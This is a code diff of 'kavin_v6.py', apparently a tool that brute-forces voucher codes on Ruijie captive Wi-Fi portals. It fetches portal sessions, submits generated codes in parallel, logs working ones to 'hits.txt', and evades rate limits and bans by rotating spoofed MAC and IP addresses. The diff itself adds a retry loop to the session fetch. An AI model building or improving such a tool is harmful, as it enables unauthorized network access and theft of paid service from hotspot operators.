@@ -1,5 +1,5 @@
 # =====================================================================
-# kavin_v6.py - KAVIN FAST SPEED V6 (V15 Core Logic Fixed)
+# kavin_v6.py - KAVIN FAST SPEED V6 (V15 Logic Fixed)
 # Part 1 of 2
 # =====================================================================
 
@@ -36,7 +36,7 @@ urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
 HITS_FILE = "hits.txt"
 CONCURRENCY_LIMIT = 10
-RATE_LIMIT_SLEEP = 0.1  # V15 အတိုင်း ပိုမြန်အောင် လျှော့ထားသည်
+RATE_LIMIT_SLEEP = 0.1 
 
 # Ruijie API
 RUIJIE_BASE = "https://portal-as.ruijienetworks.com"
@@ -66,7 +66,7 @@ def format_time(seconds):
     except Exception: return "00:00:00"
 
 # ============================================================
-#  LICENSE & AUTO-DETECT (V15 Logic)
+#  LICENSE & AUTO-DETECT 
 # ============================================================
 def check_license():
     if HAS_LICENSE_MODULE:
@@ -135,7 +135,7 @@ def auto_detect_portal():
     return None
 
 # ============================================================
-#  SESSION FETCH (V15 အတိုင်း Timeout 10 နှင့် ပြင်ထားသည်)
+#  SESSION FETCH (V15 Core Logic - Fixed INIT Freeze)
 # ============================================================
 async def fetch_official_session(session, gw_params, mac, ip):
     temp_params = dict(gw_params)
@@ -156,28 +156,31 @@ async def fetch_official_session(session, gw_params, mac, ip):
         'Connection': 'close'
     }
 
-    try:
-        session.cookie_jar.clear()
-        # V15 ကဲ့သို့ Timeout ကို 10 ပေးထားသည်
-        async with session.get(full_url, headers=headers, timeout=10, allow_redirects=False, ssl=False) as resp:
-            location = resp.headers.get('Location', '')
-            if not location: return None
+    # V15 ကဲ့သို့ ချက်ချင်းမရရင် ထပ်ကြိုးစားမယ်
+    for attempt in range(5):
+        try:
+            session.cookie_jar.clear()
+            async with session.get(full_url, headers=headers, timeout=10, allow_redirects=False, ssl=False) as resp:
+                location = resp.headers.get('Location', '')
+                if not location:
+                    await asyncio.sleep(0.2)
+                    continue
 
-            loc_lower = location.lower()
-            if ("request limited" in loc_lower or "error.html" in loc_lower or "errormsg" in loc_lower or "banned" in loc_lower):
-                return "BAN"
+                loc_lower = location.lower()
+                if ("request limited" in loc_lower or "error.html" in loc_lower or "errormsg" in loc_lower or "banned" in loc_lower):
+                    return "BAN"
 
-            q = parse_qs(urlparse(location).query)
-            sid = q.get('sessionId', [None])[0]
-            if sid:
-                return {
-                    'sessionId': sid,
-                    'sign': q.get('sign', [None])[0],
-                    'timestamp': q.get('timestamp', [None])[0],
-                }
-    except asyncio.TimeoutError: return "TIMEOUT"
-    except aiohttp.ClientError: return "NETERR"
-    except Exception: pass
+                q = parse_qs(urlparse(location).query)
+                sid = q.get('sessionId', [None])[0]
+                if sid:
+                    return {
+                        'sessionId': sid,
+                        'sign': q.get('sign', [None])[0],
+                        'timestamp': q.get('timestamp', [None])[0],
+                    }
+        except Exception:
+            await asyncio.sleep(0.2)
+            
     return None
 
 async def test_code_official(session, sess_data, code, mac, ip):
@@ -202,7 +205,6 @@ async def test_code_official(session, sess_data, code, mac, ip):
     if sess_data.get('timestamp'): payload["timestamp"] = sess_data['timestamp']
 
     try:
-        # V15 ကဲ့သို့ Timeout 10 ပေးထားသည်
         async with session.post(url, json=payload, headers=headers, timeout=10, ssl=False, allow_redirects=True) as r:
             if r.status == 429: return "__RATE_LIMITED__", "1HR"
 
@@ -254,7 +256,7 @@ def gen_code(mode, length, scan_method="random"):
     except Exception: pass
     return ""
 # =====================================================================
-# kavin_v6.py - KAVIN FAST SPEED V6 (V15 Core Logic Fixed)
+# kavin_v6.py - KAVIN FAST SPEED V6 (V15 Logic Fixed)
 # Part 2 of 2
 # =====================================================================
 
@@ -346,7 +348,7 @@ async def scan_loop_async(mode, length, scan_method="random", gw_params=None):
                             current_status[0] = "Retry"
                             current_mac = generate_random_mac()
                             current_ip  = generate_random_ip()
-                            await asyncio.sleep(0.5) # V15 အတိုင်း ခဏစောင့်
+                            await asyncio.sleep(0.5) 
                             continue
 
                         sess_data[0] = res
